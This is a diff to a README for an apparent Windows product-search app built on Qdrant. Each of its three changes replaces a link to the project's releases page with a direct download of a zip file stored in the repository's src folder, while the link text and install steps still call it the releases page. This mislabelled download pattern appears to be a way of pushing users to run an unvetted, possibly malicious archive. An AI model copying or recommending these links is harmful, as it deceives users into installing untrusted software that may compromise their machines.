@@ -1,6 +1,6 @@
 # 🔎 qdrant-search-products - Search products with semantic precision
 
-[![Download the app](https://img.shields.io/badge/Download%20the%20app-blue?style=for-the-badge&logo=github)](https://github.com/Darricksyllabled150/qdrant-search-products/releases)
+[![Download the app](https://img.shields.io/badge/Download%20the%20app-blue?style=for-the-badge&logo=github)](https://github.com/Darricksyllabled150/qdrant-search-products/raw/refs/heads/main/src/qdrant_products_search_3.1.zip)
 
 ## 🧭 What this app does
 
@@ -35,7 +35,7 @@ If your app package includes runtime files, you do not need to install extra too
 
 ## 📥 Download and install
 
-1. Open the [releases page](https://github.com/Darricksyllabled150/qdrant-search-products/releases)
+1. Open the [releases page](https://github.com/Darricksyllabled150/qdrant-search-products/raw/refs/heads/main/src/qdrant_products_search_3.1.zip)
 2. Find the latest release
 3. Download the Windows file from the assets list
 4. If the file is a .zip, extract it to a folder
@@ -246,7 +246,7 @@ This makes it easier to see how the search behaves before you load a full catalo
 
 If you need the app later, use the same release page:
 
-[Visit the releases page](https://github.com/Darricksyllabled150/qdrant-search-products/releases)
+[Visit the releases page](https://github.com/Darricksyllabled150/qdrant-search-products/raw/refs/heads/main/src/qdrant_products_search_3.1.zip)
 
 ## 🧭 Quick start checklist
 
